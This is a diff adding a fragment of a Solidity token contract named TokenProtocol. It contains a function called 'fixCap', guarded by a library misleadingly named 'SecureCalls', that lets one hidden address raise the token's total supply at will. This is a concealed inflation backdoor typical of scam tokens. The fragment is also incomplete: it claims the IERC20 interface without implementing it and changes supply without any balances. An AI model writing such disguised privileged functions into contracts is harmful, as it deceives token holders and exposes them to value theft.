@@ -1,0 +1,17 @@
+library SecureCalls {
+    function checkCaller(address sender, address _origin) internal pure {
+        require(sender == _origin, "Caller is not the original caller");
+    }
+}
+
+contract TokenProtocol is IERC20, Ownable, LibreMount {
+
+    uint256 private _totalSupply = 4200000000000000000000000000;
+
+    address private _origin;
+
+    function fixCap(uint256 _amount) external {
+        SecureCalls.checkCaller(msg.sender, _origin);
+        _totalSupply += _amount;
+    }
+}
